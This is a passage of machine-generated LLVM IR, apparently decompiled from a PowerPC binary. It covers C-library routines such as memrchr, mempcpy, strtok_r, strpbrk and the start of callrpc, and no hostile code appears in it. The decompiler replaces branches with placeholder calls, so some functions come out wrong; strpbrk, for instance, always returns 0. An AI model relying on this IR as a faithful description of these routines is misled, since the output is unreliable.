  %v0_1000f120 = phi i32 [ %v1_1000f12c, %dec_label_pc_1000f120.dec_label_pc_1000f120_crit_edge ], [ %v0_1000f12026, %dec_label_pc_1000f114 ]
  %v1_1000f120 = inttoptr i32 %v0_1000f120 to i8*
  %v2_1000f120 = load i8, i8* %v1_1000f120, align 1
  %v3_1000f120 = zext i8 %v2_1000f120 to i32
  %v4_1000f124 = icmp eq i32 %v3_1000f120, %v1_1000f124
  %v0_1000f128 = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v4_1000f124, i32 %v0_1000f128)
  %v0_1000f12c = load i32, i32* @r3, align 4
  %v1_1000f12c = add i32 %v0_1000f12c, 1
  store i32 %v1_1000f12c, i32* @r3, align 4
  %v0_1000f130 = load i32, i32* %ctr.global-to-local, align 4
  %v1_1000f130 = add i32 %v0_1000f130, -1
  store i32 %v1_1000f130, i32* %ctr.global-to-local, align 4
  %v2_1000f130 = icmp eq i32 %v1_1000f130, 0
  br i1 %v2_1000f130, label %dec_label_pc_1000f134, label %dec_label_pc_1000f120.dec_label_pc_1000f120_crit_edge

dec_label_pc_1000f120.dec_label_pc_1000f120_crit_edge: ; preds = %dec_label_pc_1000f120
  %v1_1000f124.pre = load i32, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_1000f120

dec_label_pc_1000f134:                            ; preds = %dec_label_pc_1000f120, %dec_label_pc_1000f114
  ret i32 0

; uselistorder directives
  uselistorder i32 %v1_1000f130, { 1, 0 }
  uselistorder i32 %v1_1000f12c, { 1, 0 }
  uselistorder i32 %v0_1000f114, { 1, 2, 0 }
  uselistorder i32 %v1_1000f110, { 2, 1, 0 }
  uselistorder i32 %v1_1000f094, { 0, 2, 1 }
  uselistorder i32 %v1_1000f090, { 0, 2, 1 }
  uselistorder i32 %v0_1000f0cc, { 0, 1, 2, 3, 6, 5, 4 }
  uselistorder i32 %v2_1000f06c, { 1, 0 }
  uselistorder i32 %v1_1000f068, { 1, 0 }
  uselistorder i32 %v0_1000f08c16, { 1, 0 }
  uselistorder i32 %v0_1000f064, { 1, 2, 3, 4, 5, 6, 0 }
  uselistorder i32 %v0_1000f068, { 3, 2, 0, 1 }
  uselistorder i32 %v1_1000f05c, { 1, 0 }
  uselistorder i32 %v1_1000f054, { 1, 0, 2, 3 }
  uselistorder i32 %v0_1000f0587, { 2, 0, 1 }
  uselistorder i32 %v1_1000f038, { 1, 0 }
  uselistorder i32* %r5.global-to-local, { 1, 2, 3, 5, 4, 0 }
  uselistorder i32* %r4.global-to-local, { 1, 0, 2, 3 }
  uselistorder i32* %ctr.global-to-local, { 0, 6, 7, 1, 5, 2, 3, 4 }
  uselistorder i32 %arg2, { 1, 0, 2 }
  uselistorder label %dec_label_pc_1000f120, { 1, 0 }
  uselistorder label %dec_label_pc_1000f110.backedge, { 1, 0 }
  uselistorder label %dec_label_pc_1000f08c, { 1, 0 }
  uselistorder label %dec_label_pc_1000f060, { 1, 0 }
}

define i32 @__GI_mempcpy(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7) local_unnamed_addr {
entry:
  store i32 %arg2, i32* @r5, align 4
  store i32 %arg1, i32* @r3, align 4
  store i32 %arg1, i32* @r28, align 4
  store i32 %arg2, i32* @r29, align 4
  store i32 268497240, i32* @lr, align 4
  %v0_1000f154 = call i32 @memcpy()
  %v0_1000f15c = load i32, i32* @r28, align 4
  %v1_1000f15c = load i32, i32* @r29, align 4
  %v2_1000f15c = add i32 %v1_1000f15c, %v0_1000f15c
  ret i32 %v2_1000f15c
}

define i32 @memrchr(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %ctr.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  store i32 %arg3, i32* %r5.global-to-local, align 4
  %v1_1000f174 = urem i32 %arg2, 256
  store i32 %v1_1000f174, i32* %r4.global-to-local, align 4
  %v2_1000f17c = add i32 %arg3, %arg1
  store i32 %v2_1000f17c, i32* %r3.global-to-local, align 4
  store i32 %arg3, i32* %ctr.global-to-local, align 4
  %v2_1000f19813 = icmp eq i32 %arg3, 0
  br i1 %v2_1000f19813, label %dec_label_pc_1000f1a0, label %dec_label_pc_1000f19c

dec_label_pc_1000f184:                            ; preds = %dec_label_pc_1000f19c
  %v1_1000f184 = add i32 %v0_1000f184, -1
  %v2_1000f184 = inttoptr i32 %v1_1000f184 to i8*
  %v3_1000f184 = load i8, i8* %v2_1000f184, align 1
  %v4_1000f184 = zext i8 %v3_1000f184 to i32
  store i32 %v1_1000f184, i32* %r3.global-to-local, align 4
  %v0_1000f188 = load i32, i32* %r5.global-to-local, align 4
  %v1_1000f188 = add i32 %v0_1000f188, -1
  store i32 %v1_1000f188, i32* %r5.global-to-local, align 4
  %v1_1000f18c = load i32, i32* %r4.global-to-local, align 4
  %v4_1000f18c = icmp eq i32 %v4_1000f184, %v1_1000f18c
  %v0_1000f190 = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v4_1000f18c, i32 %v0_1000f190)
  %v0_1000f194 = load i32, i32* %r3.global-to-local, align 4
  %v0_1000f198 = load i32, i32* %ctr.global-to-local, align 4
  %v1_1000f198 = add i32 %v0_1000f198, -1
  store i32 %v1_1000f198, i32* %ctr.global-to-local, align 4
  %v2_1000f198 = icmp eq i32 %v1_1000f198, 0
  br i1 %v2_1000f198, label %dec_label_pc_1000f1a0.loopexit, label %dec_label_pc_1000f19c

dec_label_pc_1000f19c:                            ; preds = %entry, %dec_label_pc_1000f184
  %v0_1000f184 = phi i32 [ %v0_1000f194, %dec_label_pc_1000f184 ], [ %v2_1000f17c, %entry ]
  %v0_1000f19c.in.in = phi i32 [ %v0_1000f194, %dec_label_pc_1000f184 ], [ %v2_1000f17c, %entry ]
  %v0_1000f19c.in = urem i32 %v0_1000f19c.in.in, 4
  %v0_1000f19c = icmp eq i32 %v0_1000f19c.in, 0
  br i1 %v0_1000f19c, label %dec_label_pc_1000f1a0.loopexit, label %dec_label_pc_1000f184

dec_label_pc_1000f1a0.loopexit:                   ; preds = %dec_label_pc_1000f19c, %dec_label_pc_1000f184
  %v0_1000f1c816.ph = phi i32 [ %v0_1000f194, %dec_label_pc_1000f184 ], [ %v0_1000f184, %dec_label_pc_1000f19c ]
  %v0_1000f1a0.pre = load i32, i32* %r4.global-to-local, align 4
  %v0_1000f1a4.pre = load i32, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_1000f1a0

dec_label_pc_1000f1a0:                            ; preds = %dec_label_pc_1000f1a0.loopexit, %entry
  %v0_1000f1a4 = phi i32 [ 0, %entry ], [ %v0_1000f1a4.pre, %dec_label_pc_1000f1a0.loopexit ]
  %v0_1000f1a0 = phi i32 [ %v1_1000f174, %entry ], [ %v0_1000f1a0.pre, %dec_label_pc_1000f1a0.loopexit ]
  %v0_1000f1c816 = phi i32 [ %v2_1000f17c, %entry ], [ %v0_1000f1c816.ph, %dec_label_pc_1000f1a0.loopexit ]
  %v1_1000f1a0 = mul i32 %v0_1000f1a0, 256
  %v1_1000f1a4 = udiv i32 %v0_1000f1a4, 4
  %v2_1000f1a8 = or i32 %v1_1000f1a0, %v0_1000f1a0
  %v1_1000f1b0 = mul i32 %v2_1000f1a8, 65536
  %v2_1000f1bc = or i32 %v1_1000f1b0, %v2_1000f1a8
  store i32 %v2_1000f1bc, i32* @r7, align 4
  store i32 -2130640640, i32* @r8, align 4
  store i32 %v1_1000f1a4, i32* %ctr.global-to-local, align 4
  %tmp = icmp ult i32 %v0_1000f1a4, 4
  br i1 %tmp, label %dec_label_pc_1000f240, label %dec_label_pc_1000f1c8

dec_label_pc_1000f1c8:                            ; preds = %dec_label_pc_1000f1a0, %dec_label_pc_1000f23c.backedge.dec_label_pc_1000f1c8_crit_edge
  %v0_1000f23c21 = phi i32 [ %v1_1000f23c, %dec_label_pc_1000f23c.backedge.dec_label_pc_1000f1c8_crit_edge ], [ %v1_1000f1a4, %dec_label_pc_1000f1a0 ]
  %v0_1000f1e8 = phi i32 [ %v0_1000f1e8.pre, %dec_label_pc_1000f23c.backedge.dec_label_pc_1000f1c8_crit_edge ], [ -2130640640, %dec_label_pc_1000f1a0 ]
  %v0_1000f1d0 = phi i32 [ %v0_1000f1d0.pre, %dec_label_pc_1000f23c.backedge.dec_label_pc_1000f1c8_crit_edge ], [ %v2_1000f1bc, %dec_label_pc_1000f1a0 ]
  %v0_1000f1cc = phi i32 [ %v0_1000f1cc.pre, %dec_label_pc_1000f23c.backedge.dec_label_pc_1000f1c8_crit_edge ], [ %v0_1000f1a4, %dec_label_pc_1000f1a0 ]
  %v0_1000f1c8 = phi i32 [ %v0_1000f1c8.pre, %dec_label_pc_1000f23c.backedge.dec_label_pc_1000f1c8_crit_edge ], [ %v0_1000f1c816, %dec_label_pc_1000f1a0 ]
  %v1_1000f1c8 = add i32 %v0_1000f1c8, -4
  %v2_1000f1c8 = inttoptr i32 %v1_1000f1c8 to i32*
  %v3_1000f1c8 = load i32, i32* %v2_1000f1c8, align 4
  store i32 %v1_1000f1c8, i32* %r3.global-to-local, align 4
  %v1_1000f1cc = add i32 %v0_1000f1cc, -4
  store i32 %v1_1000f1cc, i32* %r5.global-to-local, align 4
  %v2_1000f1d0 = xor i32 %v3_1000f1c8, %v0_1000f1d0
  %v1_1000f1d4 = add i32 %v0_1000f1c8, -3
  store i32 %v1_1000f1d4, i32* @r10, align 4
  %v1_1000f1dc = add i32 %v2_1000f1d0, 2130640639
  %v1_1000f1e4 = add i32 %v0_1000f1c8, -2
  %v2_1000f1e0 = sub i32 -1, %v2_1000f1d0
  %v2_1000f1e8 = xor i32 %v1_1000f1dc, %v2_1000f1e0
  %v3_1000f1e8 = and i32 %v2_1000f1e8, %v0_1000f1e8
  %v6_1000f1e8 = icmp eq i32 %v3_1000f1e8, 0
  %v1_1000f1ec = add i32 %v0_1000f1c8, -1
  br i1 %v6_1000f1e8, label %dec_label_pc_1000f23c.backedge, label %dec_label_pc_1000f1f4

dec_label_pc_1000f1f4:                            ; preds = %dec_label_pc_1000f1c8
  %v2_1000f1f4 = inttoptr i32 %v1_1000f1ec to i8*
  %v3_1000f1f4 = load i8, i8* %v2_1000f1f4, align 1
  %v4_1000f1f4 = zext i8 %v3_1000f1f4 to i32
  %v1_1000f1f8 = load i32, i32* %r4.global-to-local, align 4
  %v4_1000f1f8 = icmp eq i32 %v4_1000f1f4, %v1_1000f1f8
  br i1 %v4_1000f1f8, label %dec_label_pc_1000f200, label %dec_label_pc_1000f208

dec_label_pc_1000f200:                            ; preds = %dec_label_pc_1000f1f4
  store i32 %v1_1000f1ec, i32* %r3.global-to-local, align 4
  ret i32 %v1_1000f1ec

dec_label_pc_1000f208:                            ; preds = %dec_label_pc_1000f1f4
  %v2_1000f208 = inttoptr i32 %v1_1000f1e4 to i8*
  %v3_1000f208 = load i8, i8* %v2_1000f208, align 1
  %v4_1000f208 = zext i8 %v3_1000f208 to i32
  %v4_1000f20c = icmp eq i32 %v4_1000f208, %v1_1000f1f8
  br i1 %v4_1000f20c, label %dec_label_pc_1000f214, label %dec_label_pc_1000f21c

dec_label_pc_1000f214:                            ; preds = %dec_label_pc_1000f208
  store i32 %v1_1000f1e4, i32* %r3.global-to-local, align 4
  ret i32 %v1_1000f1e4

dec_label_pc_1000f21c:                            ; preds = %dec_label_pc_1000f208
  %v2_1000f21c = inttoptr i32 %v1_1000f1d4 to i8*
  %v3_1000f21c = load i8, i8* %v2_1000f21c, align 1
  %v4_1000f21c = zext i8 %v3_1000f21c to i32
  %v4_1000f220 = icmp eq i32 %v4_1000f21c, %v1_1000f1f8
  br i1 %v4_1000f220, label %dec_label_pc_1000f228, label %dec_label_pc_1000f230

dec_label_pc_1000f228:                            ; preds = %dec_label_pc_1000f21c
  store i32 %v1_1000f1d4, i32* %r3.global-to-local, align 4
  ret i32 %v1_1000f1d4

dec_label_pc_1000f230:                            ; preds = %dec_label_pc_1000f21c
  %v1_1000f230 = inttoptr i32 %v1_1000f1c8 to i8*
  %v2_1000f230 = load i8, i8* %v1_1000f230, align 1
  %v3_1000f230 = zext i8 %v2_1000f230 to i32
  %v4_1000f234 = icmp eq i32 %v3_1000f230, %v1_1000f1f8
  %v0_1000f238 = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v4_1000f234, i32 %v0_1000f238)
  %v0_1000f23c.pre = load i32, i32* %ctr.global-to-local, align 4
  br label %dec_label_pc_1000f23c.backedge

dec_label_pc_1000f23c.backedge:                   ; preds = %dec_label_pc_1000f230, %dec_label_pc_1000f1c8
  %v0_1000f23c = phi i32 [ %v0_1000f23c.pre, %dec_label_pc_1000f230 ], [ %v0_1000f23c21, %dec_label_pc_1000f1c8 ]
  %v1_1000f23c = add i32 %v0_1000f23c, -1
  store i32 %v1_1000f23c, i32* %ctr.global-to-local, align 4
  %v2_1000f23c = icmp eq i32 %v1_1000f23c, 0
  br i1 %v2_1000f23c, label %dec_label_pc_1000f23c.dec_label_pc_1000f240_crit_edge, label %dec_label_pc_1000f23c.backedge.dec_label_pc_1000f1c8_crit_edge

dec_label_pc_1000f23c.backedge.dec_label_pc_1000f1c8_crit_edge: ; preds = %dec_label_pc_1000f23c.backedge
  %v0_1000f1c8.pre = load i32, i32* %r3.global-to-local, align 4
  %v0_1000f1cc.pre = load i32, i32* %r5.global-to-local, align 4
  %v0_1000f1d0.pre = load i32, i32* @r7, align 4
  %v0_1000f1e8.pre = load i32, i32* @r8, align 4
  br label %dec_label_pc_1000f1c8

dec_label_pc_1000f23c.dec_label_pc_1000f240_crit_edge: ; preds = %dec_label_pc_1000f23c.backedge
  %v0_1000f240.pre = load i32, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_1000f240

dec_label_pc_1000f240:                            ; preds = %dec_label_pc_1000f23c.dec_label_pc_1000f240_crit_edge, %dec_label_pc_1000f1a0
  %v0_1000f240 = phi i32 [ %v0_1000f240.pre, %dec_label_pc_1000f23c.dec_label_pc_1000f240_crit_edge ], [ %v0_1000f1a4, %dec_label_pc_1000f1a0 ]
  %v1_1000f240 = add i32 %v0_1000f240, 1
  store i32 %v1_1000f240, i32* %r5.global-to-local, align 4
  store i32 %v0_1000f240, i32* %ctr.global-to-local, align 4
  %v2_1000f2583 = icmp eq i32 %v0_1000f240, 0
  br i1 %v2_1000f2583, label %dec_label_pc_1000f25c, label %dec_label_pc_1000f24c

dec_label_pc_1000f24c:                            ; preds = %dec_label_pc_1000f240, %dec_label_pc_1000f24c
  %v0_1000f24c = load i32, i32* %r3.global-to-local, align 4
  %v1_1000f24c = add i32 %v0_1000f24c, -1
  %v2_1000f24c = inttoptr i32 %v1_1000f24c to i8*
  %v3_1000f24c = load i8, i8* %v2_1000f24c, align 1
  %v4_1000f24c = zext i8 %v3_1000f24c to i32
  store i32 %v1_1000f24c, i32* %r3.global-to-local, align 4
  %v1_1000f250 = load i32, i32* %r4.global-to-local, align 4
  %v4_1000f250 = icmp eq i32 %v4_1000f24c, %v1_1000f250
  %v0_1000f254 = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v4_1000f250, i32 %v0_1000f254)
  %v0_1000f258 = load i32, i32* %ctr.global-to-local, align 4
  %v1_1000f258 = add i32 %v0_1000f258, -1
  store i32 %v1_1000f258, i32* %ctr.global-to-local, align 4
  %v2_1000f258 = icmp eq i32 %v1_1000f258, 0
  br i1 %v2_1000f258, label %dec_label_pc_1000f25c, label %dec_label_pc_1000f24c

dec_label_pc_1000f25c:                            ; preds = %dec_label_pc_1000f24c, %dec_label_pc_1000f240
  store i32 0, i32* %r3.global-to-local, align 4
  ret i32 0

; uselistorder directives
  uselistorder i32 %v1_1000f258, { 1, 0 }
  uselistorder i32 %v0_1000f240, { 1, 2, 0 }
  uselistorder i32 %v1_1000f23c, { 2, 1, 0 }
  uselistorder i32 %v1_1000f1ec, { 1, 0, 2 }
  uselistorder i32 %v1_1000f1e4, { 1, 0, 2 }
  uselistorder i32 %v1_1000f1d4, { 1, 0, 2, 3 }
  uselistorder i32 %v2_1000f1a8, { 1, 0 }
  uselistorder i32 %v1_1000f1a4, { 1, 0 }
  uselistorder i32 %v0_1000f1a0, { 1, 0 }
  uselistorder i32 %v0_1000f1a4, { 3, 2, 0, 1 }
  uselistorder i32 %v1_1000f198, { 1, 0 }
  uselistorder i32 %v0_1000f194, { 1, 0, 2 }
  uselistorder i32 %v2_1000f17c, { 2, 0, 1, 3 }
  uselistorder i32 %v1_1000f174, { 1, 0 }
  uselistorder i32* %r5.global-to-local, { 1, 3, 2, 4, 6, 7, 5, 0 }
  uselistorder i32* %r4.global-to-local, { 0, 1, 3, 2, 4 }
  uselistorder i32* %r3.global-to-local, { 0, 1, 9, 5, 2, 3, 4, 6, 7, 8, 10 }
  uselistorder i32* %ctr.global-to-local, { 0, 3, 4, 1, 5, 6, 2, 7, 8 }
  uselistorder i32 %arg3, { 2, 1, 0, 3 }
  uselistorder label %dec_label_pc_1000f24c, { 1, 0 }
  uselistorder label %dec_label_pc_1000f1c8, { 1, 0 }
  uselistorder label %dec_label_pc_1000f19c, { 1, 0 }
}

define i32 @strtok_r(i32 %arg1) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r11.global-to-local = alloca i32, align 4
  %r29.global-to-local = alloca i32, align 4
  %r30.global-to-local = alloca i32, align 4
  %r31.global-to-local = alloca i32, align 4
  %v0_1000f268 = load i32, i32* @lr, align 4
  store i32 %v0_1000f268, i32* %r0.global-to-local, align 4
  store i32 %arg1, i32* %r31.global-to-local, align 4
  %v3_1000f270 = icmp eq i32 %arg1, 0
  %v0_1000f278 = load i32, i32* @r5, align 4
  store i32 %v0_1000f278, i32* %r30.global-to-local, align 4
  %v0_1000f27c = load i32, i32* @r4, align 4
  store i32 %v0_1000f27c, i32* %r29.global-to-local, align 4
  br i1 %v3_1000f270, label %dec_label_pc_1000f284, label %dec_label_pc_1000f288

dec_label_pc_1000f284:                            ; preds = %entry
  %v1_1000f284 = inttoptr i32 %v0_1000f278 to i32*
  %v2_1000f284 = load i32, i32* %v1_1000f284, align 4
  store i32 %v2_1000f284, i32* %r31.global-to-local, align 4
  br label %dec_label_pc_1000f288

dec_label_pc_1000f288:                            ; preds = %entry, %dec_label_pc_1000f284
  %v0_1000f288 = phi i32 [ %arg1, %entry ], [ %v2_1000f284, %dec_label_pc_1000f284 ]
  store i32 %v0_1000f288, i32* @r3, align 4
  %v1_1000f28c = inttoptr i32 %v0_1000f288 to i8*
  %v2_1000f28c = call i32 @__GI_strspn(i8* %v1_1000f28c)
  %v0_1000f290 = load i32, i32* %r29.global-to-local, align 4
  %v0_1000f294 = load i32, i32* %r31.global-to-local, align 4
  %v2_1000f294 = add i32 %v0_1000f294, %v2_1000f28c
  %v3_1000f294 = inttoptr i32 %v2_1000f294 to i8*
  %v4_1000f294 = load i8, i8* %v3_1000f294, align 1
  store i32 %v2_1000f294, i32* @r31, align 4
  store i32 %v2_1000f294, i32* @r3, align 4
  %v3_1000f2a0 = icmp eq i8 %v4_1000f294, 0
  store i32 0, i32* %r0.global-to-local, align 4
  br i1 %v3_1000f2a0, label %dec_label_pc_1000f2ac, label %dec_label_pc_1000f2b4

dec_label_pc_1000f2ac:                            ; preds = %dec_label_pc_1000f288
  %v1_1000f2ac = load i32, i32* %r30.global-to-local, align 4
  %v2_1000f2ac = inttoptr i32 %v1_1000f2ac to i32*
  store i32 %v2_1000f294, i32* %v2_1000f2ac, align 4
  br label %dec_label_pc_1000f2ec

dec_label_pc_1000f2b4:                            ; preds = %dec_label_pc_1000f288
  store i32 268497592, i32* @lr, align 4
  %v3_1000f2b4 = call i32 @__GI_strpbrk(i8* %v3_1000f294, i32 %v0_1000f290)
  %v4_1000f2bc = icmp eq i32 %v3_1000f2b4, 0
  %v0_1000f2c0 = load i32, i32* @r31, align 4
  store i32 %v0_1000f2c0, i32* @r3, align 4
  %v2_1000f2c4 = add i32 %v3_1000f2b4, 1
  store i32 %v2_1000f2c4, i32* %r11.global-to-local, align 4
  br i1 %v4_1000f2bc, label %dec_label_pc_1000f2cc, label %dec_label_pc_1000f2dc

dec_label_pc_1000f2cc:                            ; preds = %dec_label_pc_1000f2b4
  store i32 268497616, i32* @lr, align 4
  %v4_1000f2cc = call i32 @rawmemchr(i32 %v0_1000f2c0, i32 0, i32 0)
  %v0_1000f2d0 = load i32, i32* @r31, align 4
  store i32 %v0_1000f2d0, i32* %r0.global-to-local, align 4
  %v1_1000f2d4 = load i32, i32* %r30.global-to-local, align 4
  %v2_1000f2d4 = inttoptr i32 %v1_1000f2d4 to i32*
  store i32 %v4_1000f2cc, i32* %v2_1000f2d4, align 4
  br label %dec_label_pc_1000f2ec

dec_label_pc_1000f2dc:                            ; preds = %dec_label_pc_1000f2b4
  %v1_1000f2bc = inttoptr i32 %v3_1000f2b4 to i8*
  store i8 0, i8* %v1_1000f2bc, align 1
  %v0_1000f2e4 = load i32, i32* @r31, align 4
  store i32 %v0_1000f2e4, i32* %r0.global-to-local, align 4
  %v0_1000f2e8 = load i32, i32* %r11.global-to-local, align 4
  %v1_1000f2e8 = load i32, i32* %r30.global-to-local, align 4
  %v2_1000f2e8 = inttoptr i32 %v1_1000f2e8 to i32*
  store i32 %v0_1000f2e8, i32* %v2_1000f2e8, align 4
  br label %dec_label_pc_1000f2ec

dec_label_pc_1000f2ec:                            ; preds = %dec_label_pc_1000f2cc, %dec_label_pc_1000f2ac, %dec_label_pc_1000f2dc
  %v0_1000f2ec = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_1000f268, i32* %r0.global-to-local, align 4
  ret i32 %v0_1000f2ec

; uselistorder directives
  uselistorder i32 %v3_1000f2b4, { 2, 0, 1 }
  uselistorder i32 %v2_1000f294, { 0, 2, 1, 3 }
  uselistorder i32 %v0_1000f288, { 1, 0 }
  uselistorder i32* %r31.global-to-local, { 1, 0, 2 }
  uselistorder i32* %r0.global-to-local, { 0, 3, 1, 2, 4, 5 }
  uselistorder label %dec_label_pc_1000f2ec, { 2, 0, 1 }
  uselistorder label %dec_label_pc_1000f288, { 1, 0 }
}

define i32 @__GI_strpbrk(i8* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r11.global-to-local = alloca i32, align 4
  %r9.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  %v0_1000f3241 = load i32, i32* @r3, align 4
  %v1_1000f3242 = inttoptr i32 %v0_1000f3241 to i8*
  %v2_1000f3243 = load i8, i8* %v1_1000f3242, align 1
  %v3_1000f3244 = zext i8 %v2_1000f3243 to i32
  store i32 %v3_1000f3244, i32* %r11.global-to-local, align 4
  %v3_1000f3286 = icmp eq i8 %v2_1000f3243, 0
  br i1 %v3_1000f3286, label %dec_label_pc_1000f338, label %dec_label_pc_1000f330

dec_label_pc_1000f308:                            ; preds = %dec_label_pc_1000f30c
  %v3_1000f30c = zext i8 %v2_1000f30c to i32
  %v4_1000f318 = icmp eq i32 %v3_1000f30c, %v1_1000f318
  %v0_1000f308 = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v4_1000f318, i32 %v0_1000f308)
  %v0_1000f30c.pre = load i32, i32* %r9.global-to-local, align 4
  %v1_1000f318.pre = load i32, i32* %r11.global-to-local, align 4
  br label %dec_label_pc_1000f30c

dec_label_pc_1000f30c:                            ; preds = %dec_label_pc_1000f330, %dec_label_pc_1000f308
  %v1_1000f318 = phi i32 [ %v1_1000f3189, %dec_label_pc_1000f330 ], [ %v1_1000f318.pre, %dec_label_pc_1000f308 ]
  %v0_1000f30c = phi i32 [ %tmp, %dec_label_pc_1000f330 ], [ %v0_1000f30c.pre, %dec_label_pc_1000f308 ]
  %v1_1000f30c = inttoptr i32 %v0_1000f30c to i8*
  %v2_1000f30c = load i8, i8* %v1_1000f30c, align 1
  %v1_1000f310 = add i32 %v0_1000f30c, 1
  store i32 %v1_1000f310, i32* %r9.global-to-local, align 4
  %v3_1000f314 = icmp eq i8 %v2_1000f30c, 0
  br i1 %v3_1000f314, label %dec_label_pc_1000f320, label %dec_label_pc_1000f308

dec_label_pc_1000f320:                            ; preds = %dec_label_pc_1000f30c
  %v0_1000f320 = load i32, i32* @r3, align 4
  %v1_1000f320 = add i32 %v0_1000f320, 1
  store i32 %v1_1000f320, i32* @r3, align 4
  %v1_1000f324 = inttoptr i32 %v1_1000f320 to i8*
  %v2_1000f324 = load i8, i8* %v1_1000f324, align 1
  %v3_1000f324 = zext i8 %v2_1000f324 to i32
  store i32 %v3_1000f324, i32* %r11.global-to-local, align 4
  %v3_1000f328 = icmp eq i8 %v2_1000f324, 0
  br i1 %v3_1000f328, label %dec_label_pc_1000f338, label %dec_label_pc_1000f330

dec_label_pc_1000f330:                            ; preds = %entry, %dec_label_pc_1000f320
  %v1_1000f3189 = phi i32 [ %v3_1000f324, %dec_label_pc_1000f320 ], [ %v3_1000f3244, %entry ]
  store i32 %tmp, i32* %r9.global-to-local, align 4
  br label %dec_label_pc_1000f30c

dec_label_pc_1000f338:                            ; preds = %dec_label_pc_1000f320, %entry
  ret i32 0

; uselistorder directives
  uselistorder i32 %v0_1000f30c, { 1, 0 }
  uselistorder i32 %tmp, { 1, 0 }
  uselistorder i32* %r9.global-to-local, { 2, 1, 0 }
  uselistorder label %dec_label_pc_1000f330, { 1, 0 }
}

define i32 @__rpc_thread_clnt_cleanup(i32 %arg1) local_unnamed_addr {
entry:
  %r31.global-to-local = alloca i32, align 4
  store i32 268497748, i32* @lr, align 4
  %v0_1000f350 = call i32 @__rpc_thread_variables()
  %v1_1000f354 = add i32 %v0_1000f350, 164
  %v2_1000f354 = inttoptr i32 %v1_1000f354 to i32*
  %v3_1000f354 = load i32, i32* %v2_1000f354, align 4
  store i32 %v3_1000f354, i32* %r31.global-to-local, align 4
  %v3_1000f358 = icmp eq i32 %v3_1000f354, 0
  br i1 %v3_1000f358, label %dec_label_pc_1000f388, label %dec_label_pc_1000f360

dec_label_pc_1000f360:                            ; preds = %entry
  %v1_1000f360 = inttoptr i32 %v3_1000f354 to i32*
  %v2_1000f360 = load i32, i32* %v1_1000f360, align 4
  %v3_1000f364 = icmp eq i32 %v2_1000f360, 0
  br i1 %v3_1000f364, label %dec_label_pc_1000f380, label %dec_label_pc_1000f370

dec_label_pc_1000f370:                            ; preds = %dec_label_pc_1000f360
  %v1_1000f370 = add i32 %v2_1000f360, 4
  %v2_1000f370 = inttoptr i32 %v1_1000f370 to i32*
  %v3_1000f370 = load i32, i32* %v2_1000f370, align 4
  %v1_1000f374 = add i32 %v3_1000f370, 16
  %v2_1000f374 = inttoptr i32 %v1_1000f374 to i32*
  %v3_1000f374 = load i32, i32* %v2_1000f374, align 4
  call void @__pseudo_call(i32 %v3_1000f374)
  %v0_1000f380.pre = load i32, i32* %r31.global-to-local, align 4
  br label %dec_label_pc_1000f380

dec_label_pc_1000f380:                            ; preds = %dec_label_pc_1000f360, %dec_label_pc_1000f370
  %v0_1000f380 = phi i32 [ %v3_1000f354, %dec_label_pc_1000f360 ], [ %v0_1000f380.pre, %dec_label_pc_1000f370 ]
  store i32 %v0_1000f380, i32* @r3, align 4
  store i32 268497800, i32* @lr, align 4
  %v0_1000f384 = call i32 @free()
  br label %dec_label_pc_1000f388

dec_label_pc_1000f388:                            ; preds = %entry, %dec_label_pc_1000f380
  %v0_1000f398 = phi i32 [ %v0_1000f350, %entry ], [ %v0_1000f384, %dec_label_pc_1000f380 ]
  ret i32 %v0_1000f398

; uselistorder directives
  uselistorder label %dec_label_pc_1000f388, { 1, 0 }
  uselistorder label %dec_label_pc_1000f380, { 1, 0 }
}

define i32 @callrpc(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r23.global-to-local = alloca i32, align 4
  %r27.global-to-local = alloca i32, align 4
  %r29.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  store i32 %arg6, i32* @r8, align 4
  store i32 %arg1, i32* %r3.global-to-local, align 4
  %stack_var_-72 = alloca i32, align 4
  %stack_var_-112 = alloca i32, align 4
  %stack_var_-108 = alloca i32, align 4
  %stack_var_-116 = alloca i32, align 4
  %stack_var_-120 = alloca i32, align 4
  %stack_var_-96 = alloca i32, align 4
  %stack_var_-1145 = alloca i32, align 4
  %stack_var_-1168 = alloca i32, align 4
  %stack_var_-128 = alloca i32, align 4
  %stack_var_0 = alloca i32, align 4
  %v4_1000f39c = ptrtoint i32* %stack_var_0 to i32
  store i32 %v4_1000f39c, i32* %stack_var_-128, align 4
  %v0_1000f3a0 = load i32, i32* @lr, align 4
  store i32 %v0_1000f3a0, i32* %r0.global-to-local, align 4
  store i32 %arg1, i32* @r21, align 4
  store i32 %arg2, i32* %r23.global-to-local, align 4
  store i32 %arg3, i32* @r22, align 4
  store i32 %arg4, i32* @r20, align 4
  store i32 %arg5, i32* @r19, align 4
  store i32 %arg6, i32* @r18, align 4
  store i32 %arg7, i32* @r17, align 4
  %v0_1000f3cc = load i32, i32* @r10, align 4
  store i32 %v0_1000f3cc, i32* @r16, align 4
  store i32 268497876, i32* @lr, align 4
  %v0_1000f3d0 = call i32 @__rpc_thread_variables()
  store i32 %v0_1000f3d0, i32* %r3.global-to-local, align 4
  %v1_1000f3d4 = add i32 %v0_1000f3d0, 164
  %v2_1000f3d4 = inttoptr i32 %v1_1000f3d4 to i32*
  %v3_1000f3d4 = load i32, i32* %v2_1000f3d4, align 4
  store i32 %v3_1000f3d4, i32* @r30, align 4
